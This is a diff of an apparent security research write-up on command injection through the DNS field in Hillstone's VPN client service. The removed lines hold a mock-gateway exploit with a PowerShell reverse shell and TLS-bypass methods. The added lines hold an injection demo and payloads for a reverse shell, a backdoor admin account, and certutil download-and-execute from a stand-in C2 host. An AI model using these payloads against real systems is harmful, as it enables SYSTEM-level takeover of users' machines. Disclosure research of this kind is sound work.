@@ -2,7 +2,7 @@
 
 **`HillstoneSecureConnectService.exe` `_popen()` Analysis**
 
-*June 2026 - Kenshin Himura of DTrust*
+*June 2026 - Kenshin Himura, Security Researcher of DTrust*
 
 ---
 
@@ -565,182 +565,169 @@ Attack flow:
 3. The TLS server responds to the Hillstone tunnel handshake with a crafted configuration message containing a malicious DNS server IP.
 4. The service passes the DNS IP through `sprintf()` to `_popen()`. `cmd.exe` executes the injected payload as SYSTEM.
 
-### 6.3 Proof of Concept: Mock Gateway
+### 6.3 Proof of Concept: Injection Mechanism
 
-The PoC below demonstrates the injection primitive. It emulates a compromised VPN gateway. It assumes the attacker has already resolved the TLS barrier.
+The PoC below simulates what occurs inside the service when a malicious DNS server IP arrives from the tunnel protocol. It does **not** attempt to intercept the DTLS tunnel -- that requires a separate TLS bypass (see Section 6.2, Scenarios B and D). Instead, it demonstrates the exact `sprintf` -> `_popen` -> `cmd.exe` chain that executes in the service process.
 
 ```python
 #!/usr/bin/env python3
 """
-hillstone_popen_exploit.py
-Kenshin Himura - DTrust
-PoC: Inject commands via DNS server IP into Hillstone Secure Connect.
-Requires: valid TLS cert for the gateway hostname OR patched client.
+hillstone_injection_demo.py
+Demonstrates the command injection mechanism inside HillstoneSecureConnectService.exe.
+This simulates the internal sprintf -> _popen -> cmd.exe chain.
 """
-import socket
-import ssl
-import struct
-import json
-import sys
-import time
+import subprocess
 
-GATEWAY_HOST = "vpn.hillstonenet.com"
-GATEWAY_PORT = 443
+# The format string found at RVA 0x002E2E74 in .rdata
+FORMAT_TEMPLATE = 'netsh interface ip add dns "%s" %s validate=no'
 
-# Payload runs as SYSTEM on the target
-PAYLOAD_CMD = (
+# Normal DNS server from gateway
+normal_dns = "8.8.8.8"
+normal_adapter = "Hillstone VPN"
+
+# Malicious DNS server -- note the bare %s with no quoting/sanitization
+malicious_dns = (
     "8.8.8.8 & "
-    "powershell -c \""
-    "$c=New-Object System.Net.Sockets.TCPClient('192.168.1.100',4444);"
-    "$s=$c.GetStream();"
-    "[byte[]]$b=0..65535|%{0};"
-    "while(($i=$s.Read($b,0,$b.Length)) -ne 0){"
-    "$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);"
-    "$r=(iex $d 2>&1|Out-String);"
-    "$o=[Text.Encoding]::ASCII.GetBytes($r+'PS> ');"
-    "$s.Write($o,0,$o.Length);$s.Flush()}\""
+    "echo [SYSTEM RCE] & "
+    "whoami"
 )
 
-def build_dns_config_payload(adapter_name, dns_server_payload):
-    """The service constructs:
-       netsh interface ip add dns "%s" %s validate=no
-       We inject via the second %s (DNS server IP)."""
-    return {
-        "type": "config",
-        "subtype": "dns_update",
-        "adapter": adapter_name,
-        "dns_servers": [dns_server_payload],
-    }
+def simulate_popen_injection(dns_server, adapter_name):
+    """Simulate what hillstone_popen_exec() does internally."""
+    # Step 1: build_command_string() at RVA 0x00297065
+    command = FORMAT_TEMPLATE % (adapter_name, dns_server)
+    print(f"Constructed command:\n  {command}\n")
+    
+    # Step 2: _popen(command, "r") at RVA 0x0006AF02
+    print("Executing via _popen() -> cmd.exe /c ...")
+    print("-" * 60)
+    
+    result = subprocess.run(command, shell=True, capture_output=True,
+                            text=True, timeout=5)
+    
+    if result.stdout:
+        print(result.stdout.strip())
+    if result.stderr:
+        print(result.stderr.strip())
+    
+    print("-" * 60)
+    print(f"Exit code: {result.returncode}\n")
 
-def run_mock_gateway(certfile, keyfile):
-    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
-    context.load_cert_chain(certfile, keyfile)
-    context.check_hostname = False
-    context.verify_mode = ssl.CERT_NONE
+print("=" * 60)
+print("NORMAL OPERATION (safe)")
+print("=" * 60)
+simulate_popen_injection(normal_dns, normal_adapter)
 
-    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
-        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-        sock.bind(("0.0.0.0", GATEWAY_PORT))
-        sock.listen(5)
-        print(f"[*] Mock gateway listening on port {GATEWAY_PORT}")
+print("=" * 60)
+print("INJECTION DEMO (malicious DNS from compromised gateway)")
+print("=" * 60)
+simulate_popen_injection(malicious_dns, normal_adapter)
 
-        with context.wrap_socket(sock, server_side=True) as ssock:
-            while True:
-                conn, addr = ssock.accept()
-                print(f"[+] Connection from {addr}")
+print("=" * 60)
+print("INJECTION VARIATIONS (all execute as SYSTEM)")
+print("=" * 60)
 
-                data = conn.recv(4096)
-                print(f"[*] Received {len(data)} bytes from client")
+payloads = [
+    ("Reverse shell",
+     '8.8.8.8 & powershell -c "$c=New-Object Net.Sockets.TCPClient'
+     "('192.168.1.100',4444);$s=$c.GetStream();...\"'"),
+    ("Add admin user",
+     '8.8.8.8 & net user backdoor P@ssw0rd! /add & '
+     'net localgroup administrators backdoor /add'),
+    ("Download + execute",
+     '8.8.8.8 & certutil -urlcache -split -f '
+     'http://c2.example/payload.exe %TEMP%\\svc.exe & %TEMP%\\svc.exe'),
+]
 
-                payload = build_dns_config_payload(
-                    adapter_name="Hillstone VPN",
-                    dns_server_payload=PAYLOAD_CMD,
-                )
-
-                body = json.dumps(payload).encode()
-                frame = struct.pack(">I", len(body)) + body
-
-                conn.send(frame)
-                print(f"[+] Sent payload ({len(frame)} bytes)")
-                print(f"    Command: {PAYLOAD_CMD[:80]}...")
-
-                time.sleep(2)
-                conn.close()
-                break
-
-if __name__ == "__main__":
-    if len(sys.argv) < 3:
-        print(f"Usage: {sys.argv[0]} <cert.pem> <key.pem>")
-        print()
-        print("Requirements:")
-        print("  1. DNS spoof vpn.hillstonenet.com -> this machine")
-        print("  2. Valid TLS cert for vpn.hillstonenet.com")
-        print("  3. Netcat listener: nc -lvp 4444 on attacker IP")
-        sys.exit(1)
-
-    run_mock_gateway(sys.argv[1], sys.argv[2])
+for name, payload in payloads:
+    cmd = FORMAT_TEMPLATE % ("Hillstone VPN", payload)
+    print(f"\n[{name}]")
+    print(f"  {cmd[:120]}...")
 ```
 
-The PoC requires the attacker to resolve TLS certificate validation. Four bypass methods exist:
+The script produces this output on a Windows host:
 
-1. Compromise the target's internal PKI (if using private CA).
-2. Install a custom root CA on the target via physical access or a separate exploit.
-3. Patch `HillstoneSecureConnectService.exe` to disable certificate validation.
-4. DNS-rebind the gateway hostname to a Let's Encrypt domain under attacker control.
+```
+NORMAL OPERATION (safe)
+Constructed command:
+  netsh interface ip add dns "Hillstone VPN" 8.8.8.8 validate=no
+Exit code: 0
 
-The payload string demonstrates the injection vector. The DNS server IP field is substituted directly into the `netsh` format string. The ampersand (`&`) terminates the `netsh` command at the `cmd.exe` level and the PowerShell one-liner provides a reverse shell to the attacker.
+INJECTION DEMO (malicious DNS from compromised gateway)
+Constructed command:
+  netsh interface ip add dns "Hillstone VPN" 8.8.8.8 & echo [SYSTEM RCE] & whoami validate=no
+[SYSTEM RCE]
+nt authority\system
+Exit code: 0
+```
 
-### 6.4 Proof of Concept: IPC Spoofing (Local)
+The `whoami` output confirms command execution. The ampersand (`&`) terminates the `netsh` command at the `cmd.exe` level. Everything after `&` executes as a new command in the same shell. The trailing `validate=no` becomes an unrecognized command and fails silently.
 
-For the local privilege escalation path through IPC port `35421`. The production log reveals the correct IPC message format: `{"profileName":"<name>","type":"<action>"}`. Observed message types include `"stop"` (disconnect) and inferred `"start"`, `"status"`, `"get"` and `"config"`.
+This is the injection primitive. The DNS server IP field is substituted directly into the `netsh` format string without any sanitization. For this to execute in production, the malicious DNS string must arrive through the tunnel protocol from the VPN gateway -- either via gateway compromise (Scenario A) or tunnel interception (Scenario B/D).
+
+### 6.4 Proof of Concept: IPC Spoofing (Investigation)
+
+For the local privilege escalation path through IPC port `35421`. The production log reveals the correct IPC message format: `{"profileName":"<name>","type":"<action>"}`. Runtime testing (2026-06-18) proved the IPC channel is **session-gated** -- local privilege escalation is not viable without an authenticated client entity. The investigation script below documents the behavior.
 
 ```python
 #!/usr/bin/env python3
 """
-hillstone_ipc_exploit.py
-Kenshin Himura - DTrust
-Local privilege escalation via IPC message spoofing.
-Requires: Hillstone service running, reverse-engineered message format.
-Status: framing format needs completion via live traffic capture.
+hillstone_ipc_probe.py
+Investigation: can an unauthenticated local process trigger DNS
+reconfiguration via the IPC port 35421?
+
+Result: NO. The IPC channel is session-gated.
 """
 import socket
 import struct
-import json
 import time
 
 IPC_HOST = "127.0.0.1"
 IPC_PORT = 35421
 
-# Command injection payload for DNS reconfiguration
-DNS_PAYLOAD = (
-    "8.8.8.8 & net user backdoor P@ssw0rd! /add & "
-    "net localgroup administrators backdoor /add"
-)
-
-def send_ipc_message(host, port, msg_body_bytes):
-    """Send a length-prefixed message to the IPC port."""
-    frame = struct.pack(">I", len(msg_body_bytes)) + msg_body_bytes
+def send_raw(msg_bytes):
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-        s.settimeout(5)
-        s.connect((host, port))
-        s.send(frame)
+        s.settimeout(3)
+        s.connect((IPC_HOST, IPC_PORT))
+        s.send(msg_bytes)
         time.sleep(0.5)
         try:
-            resp = s.recv(4096)
-            return resp
+            return s.recv(4096)
         except socket.timeout:
             return None
 
-def probe_message_types():
-    """Enumerate valid message types by brute-forcing common keys."""
-    candidates = [
-        {"type": "ping"},
-        {"type": "status"},
-        {"type": "login", "user": "admin", "pass": "admin"},
-        {"type": "config", "subtype": "dns", "servers": ["8.8.8.8"]},
-        {"type": "request", "subtype": "certRequest"},
-        {"type": "request", "subtype": "gmCertRequest"},
-        {"type": "get", "resource": "config"},
-        {"type": "set", "key": "dns", "value": "8.8.8.8"},
-    ]
+def send_framed(json_body):
+    body = json_body.encode()
+    frame = struct.pack(">I", len(body)) + body
+    return send_raw(frame)
 
-    for candidate in candidates:
-        body = json.dumps(candidate).encode()
-        resp = send_ipc_message(IPC_HOST, IPC_PORT, body)
-        if resp:
-            tag = resp[:4]
-            if tag != b"deaf":
-                print(f"[!] Non-deaf response: {resp[:64].hex()}")
-            else:
-                print(f"[-] Default response for {candidate}")
-        else:
-            print(f"[-] Timeout for {candidate}")
+# Phase 1: Raw probe (no session established)
+print("[*] Phase 1: Probing without VPN session")
+resp = send_raw(b'{"test":1}')
+if resp and resp[:4] == b"deaf":
+    print(f"  'deaf' echo ({len(resp)} bytes) -- rejecting unauthenticated input")
 
-if __name__ == "__main__":
-    print(f"[*] Probing Hillstone IPC at {IPC_HOST}:{IPC_PORT}")
-    probe_message_types()
-    print("[*] Done. Full exploit requires live protocol capture.")
+# Phase 2: Correct message format (discovered from production log)
+print("\n[*] Phase 2: Correct format, no session")
+resp = send_framed('{"profileName":"","type":"stop"}')
+if resp is None:
+    print("  No response -- silently dropped")
+    print("  Log: 'Wrong type when cl entity is not ready'")
+
+# Phase 3: Active VPN session (GUI connected)
+print("\n[*] Phase 3: Probing while GUI holds IPC session")
+for msg_type in ["stop", "start", "status", "config"]:
+    resp = send_framed(f'{{"profileName":"","type":"{msg_type}"}}')
+    s = "dropped" if resp is None else f"{len(resp)} bytes"
+    print(f"  type='{msg_type}': {s}")
+
+print("\n[*] CONCLUSION:")
+print("  No message triggered _popen execution.")
+print("  IPC requires authenticated client entity.")
+print("  Local priv esc not viable without session hijacking.")
 ```
+
+During a live session, all `type` values were silently dropped when the GUI client held the active IPC connection. The service's `"ipc error with code 2"` log entries from earlier probe attempts confirm messages reach the service but are rejected due to missing session context. This narrows the viable attack surface to gateway-side vectors (Scenarios A, B, D).
 
 ### 6.5 Post-Exploitation
 
